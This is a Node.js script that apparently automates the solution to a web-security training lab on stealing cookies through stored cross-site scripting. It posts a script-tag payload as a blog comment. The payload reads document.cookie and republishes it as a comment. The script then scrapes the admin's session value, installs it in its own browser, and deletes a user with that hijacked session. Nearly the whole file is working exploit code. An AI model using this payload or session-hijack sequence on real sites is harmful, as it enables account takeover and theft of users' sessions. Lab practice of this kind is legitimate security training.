const {
  deleteCarlos,
  openFirstBlogPost,
  runLab,
  submitComment,
} = require('./_common.cjs');

const TITLE = 'Exploiting cross-site scripting to steal cookies';
const PATH = '/web-security/cross-site-scripting/exploiting/lab-stealing-cookies';

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    const postUrl = await openFirstBlogPost(page, labUrl);
    const payload = `<script>
const form = document.querySelector('form[action*="/post/comment"]') || document.querySelector('form');
if (form) {
  const body = new URLSearchParams(new FormData(form));
  body.set('comment', 'COOKIE:' + document.cookie + ':END');
  if (body.has('name')) body.set('name', 'leaker');
  if (body.has('author')) body.set('author', 'leaker');
  if (body.has('email')) body.set('email', 'leaker@example.com');
  if (body.has('website')) body.set('website', '');
  fetch(form.getAttribute('action') || '/post/comment', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: body.toString(),
    credentials: 'include'
  });
}
</script>`;

    await submitComment(page, payload);
    console.log(`Posted payload to ${postUrl}`);

    let sessionValue = '';
    for (let attempt = 0; attempt < 24 && !sessionValue; attempt += 1) {
      // eslint-disable-next-line no-await-in-loop
      await page.waitForTimeout(3000);
      // eslint-disable-next-line no-await-in-loop
      await page.goto(postUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
      // eslint-disable-next-line no-await-in-loop
      const html = await page.content();
      sessionValue = html.match(/COOKIE:[\s\S]*?(?:^|[;\s])session=([^;:<\s]+).*?:END/i)?.[1] || '';
    }

    if (!sessionValue) {
      throw new Error('Admin cookie not exfiltrated into comments');
    }

    const ctx = page.context();
    const labDomain = new URL(labUrl).hostname;
    await ctx.clearCookies();
    await ctx.addCookies([{ name: 'session', value: sessionValue, domain: labDomain, path: '/', httpOnly: false, secure: true }]);
    await deleteCarlos(page, labUrl);
  },
});
